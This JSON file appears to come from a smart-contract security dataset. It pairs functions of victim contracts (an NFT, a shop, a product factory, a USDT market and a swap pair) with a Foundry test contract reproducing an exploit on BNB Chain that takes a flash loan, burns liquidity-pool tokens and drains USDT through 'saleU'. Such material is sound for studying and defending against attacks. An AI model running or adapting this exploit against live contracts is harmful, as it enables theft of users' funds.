[
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address to, uint256 tokenId) public virtual override {\n        address owner = ERC721.ownerOf(tokenId);\n        require(to != owner, \"ERC721: approval to current owner\");\n\n        require(_msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            \"ERC721: approve caller is not owner nor approved for all\"\n        );\n\n        _approve(to, tokenId);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) public view virtual override returns (uint256) {\n        require(owner != address(0), \"ERC721: balance query for the zero address\");\n        return _balances[owner];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(address to) external lock returns (uint amount0, uint amount1) {\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        address _token0 = token0;                                // gas savings\n        address _token1 = token1;                                // gas savings\n        uint balance0 = IERC20(_token0).balanceOf(address(this));\n        uint balance1 = IERC20(_token1).balanceOf(address(this));\n        uint liquidity = balanceOf[address(this)];\n\n        bool feeOn = _mintFee(_reserve0, _reserve1);\n        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\n        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\n        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\n        require(amount0 > 0 && amount1 > 0, 'Pancake: INSUFFICIENT_LIQUIDITY_BURNED');\n        _burn(address(this), liquidity);\n        _safeTransfer(_token0, to, amount0);\n        _safeTransfer(_token1, to, amount1);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\n        emit Burn(msg.sender, amount0, amount1, to);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "getApproved",
    "original_code": "    function getApproved(uint256 tokenId) public view virtual override returns (address) {\n        require(_exists(tokenId), \"ERC721: approved query for nonexistent token\");\n\n        return _tokenApprovals[tokenId];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "isApprovedForAll",
    "original_code": "    function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {\n        return _operatorApprovals[owner][operator];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "mintETN",
    "original_code": "    function mintETN(string memory uri, string memory name, string memory cid) public payable {\n        require(\n            totalSupply() + 1 <= MAX_SUPPLY,\n            \"Sale would exceed max supply\"\n        );\n\n        require(\n            mintPrice <= msg.value,\n            \"Not enough coin sent\"\n        );\n\n        _mintETNNFT(uri, name, cid);\n    }\n\n    function _mintETNNFT(string memory uri, string memory name, string memory cid) internal {\n        uint256 mintIndex = totalSupply();\n        if (mintIndex < MAX_SUPPLY) {\n            _safeMint(msg.sender, mintIndex);\n            _tokenURIs[mintIndex] = uri;\n            _tokenNames[mintIndex] = name;\n            _tokenCids[mintIndex] = cid;\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "ownerOf",
    "original_code": "    function ownerOf(uint256 tokenId) public view virtual override returns (address) {\n        address owner = _owners[tokenId];\n        require(owner != address(0), \"ERC721: owner query for nonexistent token\");\n        return owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "safeTransferFrom",
    "original_code": "    function safeTransferFrom(address from, address to, uint256 tokenId) public virtual override {\n        safeTransferFrom(from, to, tokenId, \"\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "setApprovalForAll",
    "original_code": "    function setApprovalForAll(address operator, bool approved) public virtual override {\n        require(operator != _msgSender(), \"ERC721: approve to caller\");\n\n        _operatorApprovals[_msgSender()][operator] = approved;\n        emit ApprovalForAll(_msgSender(), operator, approved);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnnft",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint256 tokenId) public virtual override {\n        //solhint-disable-next-line max-line-length\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: transfer caller is not owner nor approved\");\n\n        _transfer(from, to, tokenId);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Umarket",
    "source_type": "victim_contract",
    "function_name": "saleU",
    "original_code": "    function saleU(uint256 _amount) public {\n        require(_amount > 0, \"!zero input\");\n\n        uint cost = getSaleCost(_amount);\n        uint allowed = U.allowance(msg.sender,address(this));\n        uint balanced = U.balanceOf(msg.sender);\n        require(allowed >= cost, \"!allowed\");\n        require(balanced >= cost, \"!balanced\");\n        U.transferFrom(msg.sender,address(this), cost);\n\n        uint usdtBalanced = usdt.balanceOf(address(this));\n        require(usdtBalanced >= _amount, \"!market balanced\");\n\n        usdt.transfer( msg.sender,_amount);\n        SaleU(msg.sender, _amount, cost);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnshop",
    "source_type": "victim_contract",
    "function_name": "invite",
    "original_code": "    function invite(address to, uint commId) public {\n        address commOwner = commNft.ownerOf(commId);\n        require(commOwner == msg.sender, \"not comm owner\");\n        inviteMap[commId][to] = true;\n    }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "Etnshop",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint( uint commId, string memory name, string memory logo) public returns (uint){\n        return mintTo(msg.sender,commId,name, logo);\n    }\n\n    function mintTo(address to, uint commId,string memory name, string memory logo) public returns (uint){\n        require(inviteMap[commId][to] == true, \"not invited\");\n        uint shopId = shopMap[commId].length;\n        uint tokenId = getTokenId(commId, shopId);\n\n        uint allowed = usdt.allowance(msg.sender,address(this));\n        uint balanced = usdt.balanceOf(msg.sender);\n        require(allowed >= mintCost, \"!allowed\");\n        require(balanced >= mintCost, \"!balanced\");\n        usdt.transferFrom(msg.sender,address(this), mintCost);\n\n        address commOwner = commNft.ownerOf(commId);\n        usdt.transfer(host, mintCost*30/100);\n        usdt.transfer(pool, mintCost*10/100);\n        usdt.transfer(commOwner, mintCost*60/100);\n\n        shopNft.mint(to, tokenId);\n        mintTimeMap[to] = block.timestamp;\n        mintIdMap[to] = tokenId;\n        Shop memory s = Shop(shopId,name,logo);\n        shopMap[commId].push(s);\n        mintCostMap[to] = mintCost;\n        emit Mint(to, commId, shopId, mintCost);\n        return tokenId;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "DVMFlashLoanCall",
    "original_code": "    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {\n        approveAll();\n        swap_token_to_token(address(BUSDT), address(WBNB), 7380 ether);\n\n        NFT.mintETN{value: 24.15458972 ether}(\"fw\", \"sb\", \"jb\");\n        Shop.invite(address(this), 11);\n        Shop.mint(11, \"fw\", \"sb\");\n\n        etnproduct.newProduct(11, 0, 10_000_000_000, \"jb\", \"sb\");\n\n        Pair.transfer(address(Pair), 600_000 ether);\n\n        Pair.burn(address(this));\n\n        U.approve(address(Market), 9_999_999 ether);\n\n        Market.saleU(11_253_734_856_316_884_358_000);\n\n        BUSDT.transfer(address(msg.sender), c);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address _operator,\n        address _from,\n        uint256 _tokenId,\n        bytes calldata _data\n    ) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 20_147_974);\n        deal(address(BUSDT), address(this), 0 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker BUSDT before exploit\", BUSDT.balanceOf(address(this)), 18);\n\n        DVM(dodo).flashLoan(0, 9400 * 1e18, address(this), \"0x123\");\n\n        emit log_named_decimal_uint(\"[End] Attacker BUSDT after exploit\", BUSDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EtnProduct",
    "source_type": "victim_contract",
    "function_name": "newProduct",
    "original_code": "    function newProduct(uint commId, uint shopId, uint price, string memory name, string memory video ) public {\n        bool authed = etnShop.canUploadProduct(msg.sender, commId, shopId);\n        require(authed, \"no authed\");\n        uint shopTokenId = etnShop.getTokenId(commId,shopId);\n        Product memory p = Product(price,name,video,\"\",\"\",\"\",\"\",commId, shopId);\n        address erc20Addr = factory.createContract( name,  name, bytes32(shopTokenId));\n        tokenProdMap[erc20Addr] = p;\n        shopProdListMap[shopTokenId].push(erc20Addr);\n        ownerMap[erc20Addr] = msg.sender;\n        _totalSupply++;\n        tokenList.push(erc20Addr);\n\n        addLiquidity(erc20Addr);\n        emit NewToken(erc20Addr);\n    }\n\n",
    "description": ""
  }
]